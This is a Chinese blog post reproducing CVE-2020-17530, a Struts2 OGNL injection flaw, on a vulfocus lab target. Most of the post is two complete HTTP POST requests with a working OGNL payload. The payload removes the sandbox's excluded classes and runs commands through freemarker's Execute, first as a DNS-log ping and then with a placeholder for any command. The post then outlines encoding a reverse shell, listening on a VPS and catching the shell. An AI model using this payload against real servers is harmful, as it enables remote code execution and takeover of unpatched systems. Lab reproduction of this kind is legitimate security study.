# Struts2-CVE-2020-17530 - Colin.B - 博客园

> 原文：[`www.cnblogs.com/colin-B/p/15797611.html`](https://www.cnblogs.com/colin-B/p/15797611.html)

背景：
由于 Struts2 是一个基于 MVC 设计模式的 Web 应用框架，它本质上相当于一个 servlet，在 MVC 设计模式中，Struts2 作为控制器(Controller)来建立模型与视图的数据交互。 在特定的环境下，远程攻击者通过构造 恶意的 OGNL 表达式 ,可造成 任意代码执行。

漏洞编号：
CVE-2020-17530

影响版本：
struts 2.0.0 - struts 2.5.25

复现步骤：
1，打开漏洞环境 vulfocus
![](img/2454632c7cec7cabdedafea1df553699.png)

2，对访问页面进行抓包
![](img/3158096cbfe5fe6700cfdfffa890d02f.png)

3，打开 Burp DNS Log 客户端
![](img/922fd6ce66dffda0c11321db0dbc86e1.png)

4，构造 POST 数据包

```
POST /index.action HTTP/1.1
Host: vulfocus.fofa.so:33233
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 888

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("ping    DNS Log 地址")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF— 
```

![](img/a6289b2936597c5158248541435cadcc.png)

5，发送数据包得到回显
![](img/0bf8187210b1071c7cc2374f4cf862a7.png)

6，继续构造 POST 数据包

```
POST /index.action HTTP/1.1
Host: vulfocus.fofa.so:33233
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 831

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("要执行的命令")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- 
```

![](img/3acc83e9a47723bdc222b53e7f5a2639.png)

7，发送得到回显
![](img/a4c2437cb4b32ebcc169e341b625264e.png)

8，制作反弹 shell
打开 https://www.jackson-t.ca/runtime-exec-payloads.html
![](img/002b659d7e1575871f43b2b8e2d8b8fa.png)

9，将反弹 shell 编码填入数据包
![](img/a8d769888d5a3a0d7968a11584947199.png)

10，VPS 开启监听
![](img/befb240ec3135907c88ded8abf710f1b.png)

11，发送数据包得到 shell
![](img/5c4e83d988108a5f4274c8df5c246cba.png)